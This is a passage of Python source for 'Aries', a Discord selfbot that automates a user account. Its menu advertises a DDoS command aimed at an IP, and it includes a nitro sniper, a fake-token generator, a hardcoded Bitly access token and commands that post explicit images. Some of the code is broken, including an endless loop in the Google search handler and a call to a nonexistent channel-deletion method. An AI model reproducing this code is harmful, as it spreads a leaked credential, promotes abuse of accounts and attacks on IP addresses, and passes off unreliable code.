    embed = discord.Embed(title="Aries Themes Menu", description = f"settheme » Set your theme »[{prefix}settheme <ThemeName>]\nuploadtheme » Upload a theme » [{prefix}uploadtheme <ThemeName>]\ncreatetheme » Create a New Theme » [{prefix}createtheme <name, title, imageurl, color>]\nedittheme » Edit a theme » [{prefix}edittheme <name, newtitle, newimage, newcolor>]\ninstalltheme » Install a Theme » [{prefix}installtheme <Name>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Attack Commands
@bot.command()
async def utilities(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Utilities Menu", description = f"ddos » DDoS Someone » [{prefix}ddos <threads, ip>]\npingip » Ping an IP » [{prefix}pingip <IP>]\nafk » Set your AFK Status » [{prefix}afk <True/False>]\nIplookup » Get an IP's Info » [{prefix}iplookup <ip>]\nCPU » Get Your CPU Usage and Info » [{prefix}cpu <None>]\nPoll » Make a poll! » [{prefix}poll <Question>]\nSupport » Receive Aries Support » [{prefix}support <None>]\nBackup » Backup the server you send this in » [{prefix}backup <None>]\nPingweb » Ping a website » [{prefix}pingweb <Website>]\nGoogleSearch » Search on google » [{prefix}googlesearch <Search>]\nConvertVideo » DL a YT vid to mp4 » [{prefix}convertvideo <link>]\nHeaders » Get the headers of a website » [{prefix}headers <link>]\nShortenURL » Shorten a link » [{prefix}shortenurl <link>]\nCalculator » Opens calculator » [{prefix}calculator <None>]\nOpenapp » Opens an app of choice (buggy) » [{prefix}openapp <Name>]\nWebsiteIP » Get an IP of a website » [{prefix}grabsiteip <Site>]\nCrypto » Display Crypto Currency Stats » [{prefix}Crypto <None>]\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Settings Commands
@bot.command()
async def settings(ctx):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="Aries Settings Menu", description = f"Status » Change your Status » [{prefix}status <Status>]\nSniper » Check sniper status » Check the Nitro Sniper Status » [{prefix}sniperstatus <None>]\nCheckPrefix » Check Aries Prefix » [{prefix}prefix <None>]\nSBDetector » Check Aries Detection » [{prefix}selfbotdetector <None>] » [None]\nSetSniper » Check Aries Nitro Sniper » [{prefix}setsniper <True/False>\nAFKMessage » Set Aries AFK Message » [{prefix}afkmessage <msg>\nSetDet » Set Aries SB Detector » [{prefix}setdet <val>\n\n**<> = Arguments [] = Usage**", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
#Embed Command
@bot.command()
async def embed(ctx, titleEdit, descriptionEdit):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=titleEdit, description = descriptionEdit, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.message.delete()
    await ctx.send(embed = embed) 
@bot.command()
async def folder(ctx):
    path = f"{str(os.getcwd())}"
    webbrowser.open(path)
@bot.command()
async def googlesearch(ctx, *, question):
    #Search
    searchInput = "https://google.com/search?q="+ urllib.parse.quote(question)
    #Get
    res = requests.get(searchInput)

    res.raise_for_status()

    soup = bs4.BeautifulSoup(res.text, "html.parser")
    #Get the Link elements
    linkElements = soup.select('div#main > div > div > div > a')
    #Check length of linkElements if 0 no results
    if len(linkElements) == 0:
        with open(f"./data/themes/{theme_2}.json") as f:
        #Loads the json to read contents
            config = json.load(f)
            color = config.get('color')
            sixteenIntegerHex = int(color.replace("#", ""), 16)
            readableHex = int(hex(sixteenIntegerHex), 0)
            embed = discord.Embed(title=config.get('title'), description = "No Results Found!", color=readableHex)    
            embed.set_thumbnail(url = config.get('imageurl'))
        #Else if found results
    else:
        #Link variable
        link = linkElements[0].get("href")
        #Set variable i to 0
        i = 0

        while link[0:4] != "/url" or link[14:20] == "google":

            i += 1

        link = linkElements[i].get("href")
        #Send Results
        with open(f"./data/themes/{theme_2}.json") as f:
        #Loads the json to read contents
            config = json.load(f)
            color = config.get('color')
            sixteenIntegerHex = int(color.replace("#", ""), 16)
            readableHex = int(hex(sixteenIntegerHex), 0)
            embed = discord.Embed(title=config.get('title'), description = "http://google.com" + link, color=readableHex)    
            embed.set_thumbnail(url = config.get('imageurl'))
            await ctx.send(embed = embed)
@bot.command()
async def jumpscare(ctx):
    await ctx.message.delete()
    await ctx.send("wtf is this monkey doing? https://pnrtscr.com/kqrkc7")
@bot.command()
async def backup(ctx):
    await ctx.message.delete()
    await bot.create_guild(f'backup-{ctx.guild.name}')
    try:
        for guild in bot.guilds:
            if f'backup-{ctx.guild.name}' in guild.name:
                for channels in guild.channels:
                    await channels.delete()
                for category in ctx.guild.categories:
                    x = await guild.create_category(f"{category.name}")
                    for channel in category.channels:
                        if isinstance(channel, discord.VoiceChannel):
                            await x.create_voice_channel(f"{channel}")
                        if isinstance(channel, discord.TextChannel):
                            await x.create_text_channel(f"{channel}")
                for role in ctx.guild.roles:
                    await guild.create_role(name=role.name, permissions=role.permissions, colour=role.colour)
    except Exception:
        pass
@bot.command()
async def wyrather(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    wyr = ["Would you rather Eat pizza, or Icecream for your WHOLE life?"]
    embed = discord.Embed(title= config.get('title'), description = random.choice(wyr), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
#Ban Command
@bot.command()
async def ban(ctx, member : discord.Member, *, reason = None):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
        embed = discord.Embed(title=config.get('title'), description = "Banned " + member.mention + " Successfully! ", color=readableHex)    
        embed.set_thumbnail(url = config.get('imageurl'))
        await member.ban(reason = reason)
        await ctx.send(embed = embed)
    except:
        embed = discord.Embed(title=config.get('title'), description = "Error | Insufficient Perms!", color=readableHex)    
        embed.set_thumbnail(url = config.get('imageurl'))
        await ctx.send(embed = embed) 
@bot.command()
#Kick Commmand
async def kick(ctx, member : discord.Member, *, reason = None):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
      embed = discord.Embed(title=config.get('title'), description = "Kicked " + member.mention + " Successfully! ", color=readableHex)    
      embed.set_thumbnail(url = config.get('imageurl'))
      await member.kick(reason = reason)
      await ctx.send(embed = embed) 
    except commands.MissingPermissions:
     embed = discord.Embed(title=config.get('title'), description = "Error | Insufficient Perms!", color=readableHex)    
     embed.set_thumbnail(url = config.get('imageurl'))
     await ctx.send(embed = embed) 
@bot.command()
#Purge Commmand
async def purge(ctx, limit: int):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
      await ctx.channel.purge(limit=limit)
      embed = discord.Embed(title=config.get('title'), description = "Cleared " + "Successfully", color=readableHex)    
      embed.set_thumbnail(url = config.get('imageurl'))
      await asyncio.sleep(10)
      await ctx.send(embed = embed) 
    except commands.MissingPermissions:
     embed = discord.Embed(title=config.get('title'), description = "Error | Insufficient Perms!", color=readableHex)    
     embed.set_thumbnail(url = config.get('imageurl'))
     await ctx.send(embed = embed) 
@bot.command()
#Create Commmand
async def create(ctx, name):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
      guild = ctx.guild
	  #channel = await guild.create_text_channel(channel_name)
      await guild.create_text_channel(name)
      embed = discord.Embed(title=config.get('title'), description = "Created " + "Successfully", color=readableHex)    
      embed.set_thumbnail(url = config.get('imageurl'))
      await ctx.send(embed = embed) 
    except commands.MissingPermissions:
     embed = discord.Embed(title=config.get('title'), description = "Error | Insufficient Perms!", color=readableHex)    
     embed.set_thumbnail(url = config.get('imageurl'))
     await ctx.send(embed = embed) 
@bot.command()
async def shortenurl(ctx, link):
    ctx.message.delete()
    #Bitly Access
    BITLY_ACCESS_TOKEN ="84ad42991d089c4629293f0cf5f2fa1a65c3b1f0" 
    #Connect with the token
    access = bitly_api.Connection(access_token = BITLY_ACCESS_TOKEN)
    #Shorten url
    short_url = access.shorten(link)  
    #Send shorter URL

    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = f"Shorter Link: {short_url['url']}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
#Delete command
@bot.command()
async def delete(ctx, name):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    try:
      guild = ctx.guild
	  #channel = await guild.create_text_channel(channel_name)
      await guild.delete_text_channel(name)
      embed = discord.Embed(title=config.get('title'), description = "Deleted " + "Successfully", color=readableHex)    
      embed.set_thumbnail(url = config.get('imageurl'))
      await ctx.send(embed = embed) 
    except commands.MissingPermissions:
     embed = discord.Embed(title=config.get('title'), description = "Error | Insufficient Perms!", color=readableHex)    
     embed.set_thumbnail(url = config.get('imageurl'))
     await ctx.send(embed = embed) 
#RollDice command
@bot.command()
async def roll(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = str(random.randrange(1, 2000)), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
#Restart Commmand
@bot.command()
async def restart(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = "Restarting in 5 seconds...", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
    #Give user time to know we are restarting // Sleep 5 Seconds
    await asyncio.sleep(5)
    #Exit and Run the bot Agian
    os.execl(sys.executable, sys.executable, "\"{}\"".format(sys.argv[0]))
@bot.command()
async def faketoken(ctx):
   y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(17))
   x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(3))
   w = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(27))
   with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
    config = json.load(f)
    color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="", description = f"ODg4ODI{y}.YUY{x}.{w}\n", color=readableHex)
    embed.set_footer(text = "made with ♡ by bomt")
    embed.set_thumbnail(url = config.get('imageurl'))
    await ctx.send(embed=embed)
#Boobs Command
@bot.command()
async def boobs(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title="", description = "", color=readableHex)
    boobs = ["https://external-preview.redd.it/_8von5M373BhKDn4sUUtZO0ejyegPnjYcaboJ4LHG18.jpg?width=640&crop=smart&auto=webp&s=08da86e1978676e513b91a2dbc3d88725fb75db1", "https://preview.redd.it/oqwo0gq23vn61.jpg?width=960&crop=smart&auto=webp&s=fd154960c155a57f9659ea1755dd3073d44560b5", "https://external-preview.redd.it/hfW3TZ2jmZVmlQHBs9ag4IPvCbb2KWu5Mb2VCN9JHiw.jpg?width=640&crop=smart&auto=webp&s=457c2174307f125e4af4d219475362e819b415a4", "https://external-preview.redd.it/8pBuABS3Walu8_nePp_0E71lcxQqloq_xCwS7fQ6niA.jpg?width=640&height=491&crop=smart&auto=webp&s=6a3e174509e3349d4c0e7a945e1b77d55d8db946", "https://bootyalbum.com/wp-content/uploads/2021/02/Would-Reddit-appreciate-my-18-yo-DD-boobs-892x1189.jpg", "https://i.redd.it/j6krhwtjlt371.jpg", "https://i.redd.it/jkzx3cedofu61.jpg"]
    embed.set_footer(text = "made with ♡ by bomt")
    embed.set_image(url=random.choice(boobs))
    await ctx.send(embed=embed)
#Status Command
@bot.command()
async def status(ctx, *args):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    #AFK
    embed = discord.Embed(title=config.get('title'), description = "Changed Status to AFK", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    #Online
    embed1 = discord.Embed(title=config.get('title'), description = "Changed Status to Online", color=readableHex)
    embed1.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    #DND
    embed2 = discord.Embed(title=config.get('title'), description = "Changed Status to DND", color=readableHex)
    embed2.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    stati = {
        "on":       Status.online,
        "online":   Status.online,
        "off":      Status.invisible,
        "offline":  Status.invisible,
        "dnd":      Status.dnd,
        "idle":     Status.idle,
        "afk":      Status.idle
    }
    if args:
        if (args[0] in stati):
            #Checks if Args are equal to AFK ex .status the args would be after status
            if (args[0] == "afk"):
                await bot.change_presence(status=Status.idle, afk=True)
                await ctx.send(embed=embed)
    if (args[0] == "dnd"):
        await bot.change_presence(status=Status.dnd, afk=False)
        await ctx.send(embed=embed2)
    if (args[0] == "online"):
        await bot.change_presence(status=stati[args[0]], afk=False)
        await ctx.send(embed=embed1)
@bot.command()
async def openapp(ctx, app):
    call([f"{app}.exe"])
    print(app)
@bot.command()
async def calculator(ctx):
    await ctx.message.delete()

    call(["calc.exe"])

    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = f"Opened!", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def keyinfo(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = f"Beta Build: {betarelease}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    embed2 = discord.Embed(title=config.get('title'), description = f"Beta Build: {betarelease}\nThis CMD Is bugged!", color=readableHex)
    embed2.set_thumbnail(url = config.get('imageurl'))
    embed2.set_footer(text = "made with ♡ by bomt")
    bob = await ctx.send(embed = embed)
    await asyncio.sleep(3)
    await bob.edit(embed = embed2)
@bot.command()
async def isbeta(ctx):
    global betarelease
    global license_key
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = f"Beta Build: {betarelease}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
#UserInfo Command
@bot.command()
async def userinfo(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    global start_time
    end_time = dt.now()
    embed = discord.Embed(title= config.get('title'), description = 'Time Since Start: {}'.format(end_time - start_time), color=readableHex)
    userinfo1 = bot.get_user(bot.user.id)
    num = 0
    for i in range (0, len(bot.user.friends)):
        num += 1
    embed = discord.Embed(title=config.get('title'), description = "Name » " + str(bot.user) + "\nUsers In » " + str(len(bot.guilds)) + f" Guilds\n" + 'You have been using Aries For » {}'.format(end_time - start_time) + f"\nYour Account Was Created At »\n {userinfo1.created_at}" + f"\nYou Have: {int(num)} Friends" + "\nAvatar ↓ ", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    embed.set_image(url = str(bot.user.avatar_url))
    await ctx.send(embed = embed)
#todo command
@bot.command()
async def todo(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title=config.get('title'), description = "New UI\nSecurity\nFinish 30 Commands", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
#Sniper Command
@bot.command()
async def sniperstatus(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= config.get('title'), description = str(f"{nitro_sniper}"), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
#Avatar Command
@bot.command()
async def avatar(ctx, *, user: discord.Member = None):
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    await ctx.message.delete()
    embed = discord.Embed(title= str(user) + "'s Avatar", description = "", color=readableHex)
    embed.set_image(url = str(user.avatar_url))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
#Sniper Command
@bot.command()
async def allah(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "I AM ALLAH" + "'s Avatar", description = "ALLAH HAS SPOKEN GET ARIES", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def pickup(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    pickuplines = ["if you were a booger, i'd pick you first", "sup, are you from tennessee? cause your the only 10 i see ", "basic math: add the bed, subtract the clothes, divide the legs, and pray we don't multiply ", "you're so hot, my zipper is falling for you", "Are you an elevator? Because I’ll go up and down on you."]
    embed = discord.Embed(title= "Aries Pickup line", description = random.choice(pickuplines), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def joke(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    jokes = ["Why did the orange lose the race? It ran out of juice.", "How you fix a broken pumpkin? With a pumpkin patch", "What's the best thing about Switzerland? I don't know, but the flag is a big plus.", "Why do peppers make such good archers? Because they habanero.", "What did the sink tell the toilet? You look flushed!", "Can February March? No, but April May!Can February March? No, but April May!", "I hated facial hair but then it grew on me.", ]
    embed = discord.Embed(title= "Aries The Comedian", description = random.choice(jokes), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def headers(ctx, website):
    ctx.message.delete()
    r = requests.get(website, allow_redirects=True)
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Headers", description = f"Headers: {r.headers}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
@bot.command()
async def rickroll(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Just Ricked YOU!", description = "https://www.youtube.com/watch?v=dQw4w9WgXcQ", color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/758834492931833938/894667218875461652/unknown.png")
    embed.set_image(url = "https://media.giphy.com/media/Ju7l5y9osyymQ/giphy.gif")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
@bot.command()
async def ariesinvite(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Invite", description = "https://www.youtube.com/watch?v=dQw4w9WgXcQ", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed) 
@bot.command()
async def cn(ctx, name, contents):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    ISDIR = os.path.isdir("./data/notes/")
    if not ISDIR:
        os.mkdir("./data/notes")
    with open("./data/notes/" + name + ".json", "w") as f:
        f.write(json.dumps(str(contents), indent=4))

    embed = discord.Embed(title= "Aries Notification", description = "Made Note with Contents: " + contents, color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def en(ctx, notename, newcontent):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    ISDIR = os.path.exists("./data/notes/" + notename + ".json")
    ISDIR2 = os.path.isdir("./data/notes")
    if not ISDIR2:
        os.mkdir("./data/notes")
    if ISDIR:
     with open("./data/notes/" + notename + ".json", "w") as f:
        f.write(json.dumps(str(newcontent), indent=4))
     embed = discord.Embed(title= "Aries Notification", description = "Edited " + notename + " with Contents: " + newcontent, color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt")
     await ctx.send(embed = embed)
    else:
     embed = discord.Embed(title= "Aries Notification", description = "No note found with the name: " + notename, color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt")
     await ctx.send(embed = embed)
@bot.command()
async def leave(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    guild = ctx.guild
    print(Fore.CYAN + "Info" + Fore.RESET + " | " + Fore.LIGHTCYAN_EX + "[!] " + Fore.CYAN + "Left Server » " + Fore.LIGHTCYAN_EX + str(guild))
    await asyncio.sleep(1)
    await guild.leave()
@bot.command()
async def hentai(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    hentai = ["https://i.redd.it/f7bvxozp9kb61.png", "https://i.redd.it/okplmg1aq7961.png", "https://preview.redd.it/olv12c8bze271.png?auto=webp&s=045669166e29212f8724a54bc22d72cca7822ef8", "https://i.redd.it/y5uy7ipxmej41.jpg", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTImivRmr0qEeXzHNFRdQRuHTAYLSBUJqvydQ&usqp=CAU"]
    embed = discord.Embed(title= "", description = "", color=readableHex)
    embed.set_image(url = random.choice(hentai))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def fakenitro(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    await ctx.send("https://cdn.discordapp.com/attachments/769698485527248907/895897569589346314/unknown.png")
@bot.command()
async def checkprefix(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Prefix", description = f"{prefix}", color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def ln(ctx):
    await ctx.message.delete()
    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    onlyfiles = [f for f in listdir("./Data/Notes")]
    file = str(onlyfiles)
    file2 = file.replace(".json", "")
    embed = discord.Embed(title= "Aries Notification", description = str(file2.replace("'", "")), color=readableHex)
    embed.set_thumbnail(url = "https://cdn.discordapp.com/attachments/895179941740699668/896247994796634133/standard_2.gif%22")
    embed.set_footer(text = "made with ♡ by bomt")
    await ctx.send(embed = embed)
@bot.command()
async def setdet(ctx, val):
    await ctx.message.delete()
    global afkmode
    global fake_nitro
    args1 = str(val)
    args2 = args1.replace("T", "t")
    data = {
        "token": f"{token}",
        "prefix": f"{prefix}",
        "sniper": f"{nitro_sniper}",
        "detector": f"{args2}",
        "theme": f"{theme_2}",
        "AFK": f"{afkmode}",
        "AFK-Message": f"{afkmsg}",
        "Fake-Nitro": f"{fake_nitro}"
    }
    with open(f"./data/config.json", "w") as f:
        f.write(json.dumps(data, indent=4))

    with open(f"./data/themes/{theme_2}.json") as f:
    #Loads the json to read contents
     config = json.load(f)
     color = config.get('color')
    sixteenIntegerHex = int(color.replace("#", ""), 16)
    readableHex = int(hex(sixteenIntegerHex), 0)
    embed = discord.Embed(title= "Aries Sniper", description = "Set SB Detection To: " + str(args2), color=readableHex)
    embed.set_thumbnail(url = config.get('imageurl'))
    embed.set_footer(text = "made with ♡ by bomt")
